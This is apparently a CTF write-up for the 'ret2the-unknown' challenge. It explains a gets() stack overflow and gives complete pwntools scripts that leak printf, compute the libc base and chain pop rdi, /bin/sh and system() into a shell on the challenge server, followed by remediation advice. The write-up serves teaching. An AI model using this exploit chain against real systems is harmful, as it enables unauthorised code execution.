title:  Ret2The-Unknown Writeup
description: This challenge was about exploiting a binary via a return-to-libc attack (due to the enabled NX bit). The address of printf was provided to faciliate exploitation, however it was only given after passing in user input. This address could not be used for future execution of the binary due to the presence of ASLR. Nevertheless, despite the presence of the enabled NX bit and ASLR, the binary was vulnerable.

Executive Summary
=================

The utilization of the insecure gets() function resulted in a buffer overflow vulnerability. This security hole was exploited to execute arbitrary code despite the enabled NX bit via a return-to-libc attack. The deprecated gets() function should be replaced with the more secure fgets() alternative to prevent the attack mentioned in this report. It is highly suggested that the process running on port 31568 be terminated as soon as possible until the remediations outlined in the [Conclusion](#h.susjdnco5e24) section are followed.   

Attack Narrative
================

The destination and port on which this binary is running were given:

Destination

Port

mc.ax

31568

Additionally, the source code and libc file used by the binary were provided.

Binary Analysis
---------------

### Source Code

{% highlight c %}  
#include <stdio.h>  
#include <string.h>  

int main(void)  
{ char your_reassuring_and_comforting_we_will_arrive_safely_in_libc[32];  
  
 setbuf(stdout, NULL);  
 setbuf(stdin, NULL);  
 setbuf(stderr, NULL); puts("that board meeting was a *smashing* success! rob loved the challenge!"); puts("in fact, he loved it so much he sponsored me a business trip to this place called 'libc'..."); puts("where is this place? can you help me get there safely?"); // please i cant afford the medical bills if we crash and segfault gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc); puts("phew, good to know. shoot! i forgot!"); printf("rob said i'd need this to get there: %llxn", printf); puts("good luck!");  
}
{% endhighlight %}  

At the top of the file, 32 bytes were allocated to the your_reassuring_and_comforting_we_will_arrive_safely_in_libc buffer (for the sake of shortening this name, this buffer is called input_buffer throughout this report). After initializing input_buffer, a series of three setbuf() calls are run, a function which controls the way a stream is buffered. Additionally, this function can control the size of the buffer, however due to the fact that the buffer argument is NULL, the stream is unbuffered[[1]](#ftnt1).

Following the setbuf() calls is a succession of three puts() calls before the insecure gets() function is run with input_buffer as the argument. After providing an input, the printf() function is called which prints out the address of printf in memory.

### Behavior

Looking at the security of the binary with the checksec command, it is found that the NX bit of the binary is enabled:

{% highlight bash %}
┌─[✗]─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $checksec ret2the-unknown [*] '/home/0xd4y/business/ctf/redpwn/pwn/ret2the-unknown/ret2the-unknown'   Arch:     amd64-64-little   RELRO:    Partial RELRO   Stack:    No canary found   NX:       NX enabled   PIE:      No PIE (0x400000)
{% endhighlight %}  

Note that this binary is 64-bit in little endianness

Therefore, the RIP cannot simply be overwritten to point to shellcode. However, the instruction pointer can easily be overwritten due to the lack of a stack canary. Furthermore, there is no PIE (Position Independent Executables) which means that the libc base can be calculated by finding the offset of the executables (this is examined in detail in the [Finding Base Libc Address](#h.7rxf70l4dide) section). This element is essential to the success of return-to-libc attacks.

When executing the binary, user input can be provided after the “safely?” string:

{% highlight bash %}
┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $./ret2the-unknown  
that board meeting was a *smashing* success! rob loved the challenge!in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...where is this place? can you help me get there safely?  
test_string  
phew, good to know. shoot! i forgot!  
rob said i'd need this to get there: 7f8c6accfcf0  
good luck!
{% endhighlight %}  

Only after providing an input, the binary printed out the address of printf(). However, this address changes with each new execution of the binary:

{% highlight bash %}
┌─[✗]─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $./ret2the-unknown

{% endhighlight %}  

The printf() address is shown in red

This change is evidence of the existence of ASLR (address space layout randomization), which is a security feature to help prevent memory corruption vulnerabilities. Therefore, the base address of libc cannot be easily calculated by subtracting the address of printf in the previous execution of the binary by the printf symbol in the given libc file.

Exploit Construction
--------------------

### GDB

Thus, to correctly calculate the libc base address, it is essential to overwrite RIP to point to main() so that the binary allows us to input a second payload (this time with the knowledge of the printf address). First, the offset of RIP must be calculated:

{% highlight bash %}

40

The program received a segmentation fault error, and the offset of RIP was calculated to be 40 bytes. Therefore, upon inputting 40 junk bytes followed by the address of the main function, the program will repeat. Using the info functions GDB command, the address of the main function can be found:

0x0000000000401186  main
{% endhighlight %}  

The overall exploit can be summarized into two waves: wave one consists of repeating the main function and retrieving the printf address, and wave two consists of calling the libc system() function with /bin/sh as the argument.

### PwnTools

#### Rerunning main()

Using pwntools[[2]](#ftnt2), a python library made for facilitating the process of writing binary exploits, we can create a program (which was named poc.py) to exploit the program:

{% highlight python %}
from pwn import *  
  
REMOTE = False  
  
if REMOTE:  
   p = remote("mc.ax",31568)  
else:   p = process("./ret2the-unknown")  
  
rip_offset = 40  
main = 0x0000000000401186  
payload = b'A'*40 + p64(main)  
  
p.recvuntil(b"safely?")  
p.sendline(payload)  
p.interactive()
{% endhighlight %}  

The code shown above first starts a local process for the binary. Afterwards, the payload is sent and an interactive instance is called to the process:

{% highlight bash %}
┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $python3 poc.py

   fd.close()  
BrokenPipeError: [Errno 32] Broken pipe
{% endhighlight %}  

The main function was successfully called again. Now the printf function address can be retrieved to find the base libc address for the second wave of the exploit.

#### Finding Base Libc Address

With the knowledge of where the printf function is in memory, the base address of libc can be calculated, and therefore the address of system() and location of the /bin/sh string can be determined by adding their offsets to the base libc address:

{% highlight python %}
from pwn import *  

REMOTE = False  
  
if REMOTE:  
   p = remote("mc.ax",31568)  
else:   p = process("./ret2the-unknown")  
  
rip_offset = 40  
main = 0x0000000000401186  
  
# Wave 1  
  
## Repeat main function  
payload = b'A'*40 + p64(main)  
p.recvuntil(b"safely?")  
p.sendline(payload)  
  
## Retrieve printf_address  
p.recvuntil(b"there: ")  
printf_address = p.recvuntil(b"luck!").split(b"n")[0].decode()  
  
# Wave 2  
  
## Get base libc address  
libc = ELF("libc-2.28.so" , checksec = False)  
libc.address = int(printf_address,16) - libc.symbols["printf"]  
  
## Get system and bin_sh addresses ready  
system = libc.symbols["system"]  
bin_sh = next(libc.search(b"/bin/sh"))  
  
log.success(f"libc base found at: {hex(libc.address)}")  
log.info(f"system at: {hex(system)}")  
log.info(f"/bin/sh at: {hex(bin_sh)}")  
p.interactive()
{% endhighlight %}  

Observe the following addresses denoted in red when executing poc.py:

{% highlight bash %}
┌─[0xd4y@Writeup]─[~/business/ctf/redpwn/pwn/ret2the-unknown]  
└──╼ $python3 poc.py

rob said i'd need this to get there: 7fe5b91ffcf0  
good luck!  
[*] Got EOF while reading in interactive
{% endhighlight %}  

The exact address of system() could be calculated due to the known offset of this function being 0x449c0 (which is 0x7fe5b91ec150 - 0x7fe5b91a7790). Note that this works because PIE is disabled.

#### Building system(“/bin/sh”)

After discovering the addresses of the system() function and /bin/sh string, it follows that the system(“/bin/sh”) call must be built and executed using the aforementioned addresses. To do so, it is important to be able to control the RDI register which is used to pass parameters into functions. The RDI, RSI, RDX, and RCX registers are all used for that purpose, but they function via a hierarchical basis, in which the parameter passed into a function follows that particular order[[3]](#ftnt3):

some_function(parameter1,parameter2,parameter3,parameter4)

parameter1 corresponds to RDI, parameter2 corresponds to RSI, and so on.

Therefore, to pass /bin/sh to system(), it is important to pop the RDI register and pass in the desired parameter value. Using the ROPgadget --binary ret2the-unknown command, ROP gadgets that perform the desired pop operation can be found with their respective locations in memory:

0x00000000004012a3 : pop rdi ; ret

Exploit
-------

Using this gadget, the system() call will contain /bin/sh as its argument, and a shell will be returned:

{% highlight python %}
from pwn import *  
  
REMOTE = True  
  
if REMOTE:  
   p = remote("mc.ax",31568)  
else:   p = process("./ret2the-unknown")  
  
rip_offset = 40  
main = 0x0000000000401186  
{% endhighlight %}  
  
# Wave 1  
  
{% highlight bash %}
## Repeat main function  
payload = b'A'*40 + p64(main)  
p.recvuntil(b"safely?")  
p.sendline(payload)  
  
# Retrieve printf_address  
p.recvuntil(b"there: ")  
printf_address = p.recvuntil(b"luck!").split(b"n")[0].decode()    
  
## Wave 2  
  
# Get base libc address  
libc = ELF("libc-2.28.so" , checksec = False)  
  
print(libc.symbols["system"])  
libc.address = int(printf_address,16) - libc.symbols["printf"]  
  
# Get system and bin_sh address ready  
system = libc.symbols["system"]  
bin_sh = next(libc.search(b"/bin/sh"))  
  
log.success(f"libc base found at: {hex(libc.address)}")  
log.info(f"system at: {hex(system)}")  
log.info(f"/bin/sh at: {hex(bin_sh)}")  
  
# Creating the final payload  
pop_rdi = 0x00000000004012a3  
payload = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)  
  
p.sendline(payload)  
p.interactive()
{% endhighlight %}

Running the exploit results in the successful return of a shell:

Conclusion
==========

* * *

The insecure gets() function should never be used due to its lack of boundary checks on user input. This can result in the overwriting of memory that can lead to arbitrary code execution. ASLR and enabling the NX bit are not adequate in the prevention of binary exploitation (however they do help mitigate vulnerabilities). The following remediations should be strongly considered to prevent the attack outlined in this report:

*   Replace the gets() function with fgets()

*   The latter performs boundary checks on user input which mitigates buffer overflow attacks

*   Implement PIE

*   Return-to-libc attacks worked by calculating the addresses of the system function and base libc address based on their known offers
*   By enabling PIE, the known offsets between executables cannot be predicted as they change with each new runtime process

*   Implement  a stack canary

*   The stack canary will mitigate buffer overflow attacks by protecting the return pointer

Port 31568 should be closed immediately until the current binary is replaced with a more secure version that follows the aforementioned remediations.
